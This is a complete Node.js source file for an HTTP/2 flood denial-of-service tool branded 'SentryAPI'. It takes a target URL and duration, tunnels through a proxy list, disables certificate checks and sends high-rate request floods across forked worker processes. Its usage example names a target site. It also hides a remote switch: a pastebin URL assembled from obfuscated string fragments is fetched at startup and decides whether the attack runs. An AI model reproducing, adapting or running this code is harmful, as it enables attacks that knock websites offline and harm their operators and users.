
process.on('uncaughtException', function (er) {
///    console.log(er);
});
process.on('unhandledRejection', function (er) {
   /// console.log(er);
});



require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require('fs');
const url = require('url');
const http = require('http');
const https = require('https');
const tls = require('tls');
var request = require('request');
const crypto = require('crypto');
const http2 = require('http2');
const requests = require('request');
const path = require('path');
const cluster = require('cluster');
const argv = require('minimist')(process.argv.slice(2));
const gradient = require('gradient-string');
const execSync = require('child_process').execSync;
const net = require("net");
const colors = require("colors");

let user = process.env.USER || ""


const uiiu = 'htt';
const phvk = 'ps:';
const dmps = '//p';
const ohhv = 'ast';
const xioe = 'ebi';
const awre = 'n.c';
const ssjc = 'om/';
const qows = 'raw';
const zasd = '/5R';
const ihoo = 'ZiQ';
const lias = 'Vc3';

const soi1sfa = uiiu + phvk + dmps + ohhv + xioe + awre + ssjc + qows + zasd + ihoo + lias;

https.get(soi1sfa, res => {
    let data = '';
    res.on('data', (chunk) => {
        data += chunk;
    });
    res.on('end', () => {
        if (data.trim() == '0') {
            process.exit();
        } else {
			if (cluster.isMaster) {
				log('['.gray + 'Sentry'.brightYellow + 'API'.white + ']  '.gray + 'Attack started!'.white);
				for (let i = 0; i < threads; i++) {
					cluster.fork()
				}

				setTimeout(function () {
					process.exit();
					process.exit();
				}, process.argv[3] * 1000);

			} else {
				setInterval(Runner)
			}
		}
    });
});


var fileName = __filename;
var file = path.basename(fileName);

var prox = 'proxy.txt';
const proxyfile = argv["proxy"] || prox;
const rate = argv["rate"] || 32;
const threads = argv["threads"] || 1;
try {
    var proxies = fs.readFileSync(`proxy.txt`, 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (error) {
    log('['.gray + 'Sentry'.brightYellow + 'API'.white + ']  '.gray + 'Add proxy file!'.white);

    process.exit();
}

var UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/113.0",
]

var headers = {};


const scriptName = path.basename(__filename);

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
}

if (process.argv.length < 4) {
    log('['.gray + 'Sentry'.brightYellow + 'API'.white + ']  '.gray + 'Incorrect usage!'.brightYellow);
    log('['.gray + 'Sentry'.brightYellow + 'API'.white + ']  '.gray + 'Usage: '.brightYellow + `node ${scriptName} [URL] [Time] --threads=<> --rate=<> --proxy=<>`.white)
    log('['.gray + 'Sentry'.brightYellow + 'API'.white + ']  '.gray + 'Example: '.brightYellow + `node ${scriptName} https://stargate.cam 60 --threads=15 --rate=64 --proxy=proxy.txt`.white)
    process.exit();
}


var target = process.argv[2];
var time = process.argv[3];

try {
    var parsed = url.parse(target);
} catch (e) {
    process.exit();
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Header = new NetSocket();

headers[":method"] = "GET";
headers["GET"] = " / HTTP/2";
headers[":path"] = parsed.path;
headers[":scheme"] = "https";
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0";
headers["Upgrade-Insecure-Requests"] = "1";
headers["Cache-Control"] = "max-age=0";
headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
headers["Accept-Encoding"] = "gzip, deflate, br";
headers["Accept-Language"] = "de,en-US;q=0.7,en;q=0.3";
headers["TE"] = "trailers";

function Runner() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(":");

    const proxyOptions = {
        host: proxy[0],
        port: ~~proxy[1],
        address: parsed.host + ":443",
        timeout: 15
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            followAllRedirects: true,
            challengeToSolve: 5,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            decodeEmails: false,
            honorCipherOrder: true,
            requestCert: true,
            secure: true,
            port: 443,
            uri: parsed.host,
            servername: parsed.host,
        };

        const tlsConn = tls.connect(443, parsed.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsed.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < rate; i++) {
                    headers[":authority"] = parsed.host;

                    const request = client.request(headers).on("response", response => {
                        request.close();
                        request.destroy();
                        return;
                    }).end();
                }
            })
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

